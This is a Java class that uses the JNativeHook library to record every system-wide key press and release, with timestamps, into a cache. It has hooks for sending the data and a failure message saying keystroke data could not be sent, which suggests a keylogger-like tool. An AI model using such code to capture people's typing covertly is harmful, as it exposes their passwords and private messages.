package keys;

import java.util.ArrayList;

import java.util.List;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import handlers.KeyStorage;



public class NativeKeyboard implements NativeKeyListener {
	
	private List<KeyStorage> keyCache= new ArrayList<>();
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e)
	{
		keyCache.add(new KeyStorage(e.getKeyCode(),true,System.currentTimeMillis()));
	}
	
	@Override
	public void nativeKeyReleased(NativeKeyEvent e)
	{
		keyCache.add(new KeyStorage(e.getKeyCode(),false,System.currentTimeMillis()));
	}
	
	@Override
	public void nativeKeyTyped(NativeKeyEvent e)
	{
		
	}
	
	public void onSend()
	{
		keyCache.clear();
	}
	
	public void onFail()
	{
		System.out.println("Keystroke data failed to be sent.");
	}
	public List<KeyStorage> getKeyCache() {
		return keyCache;
	}
	
	
}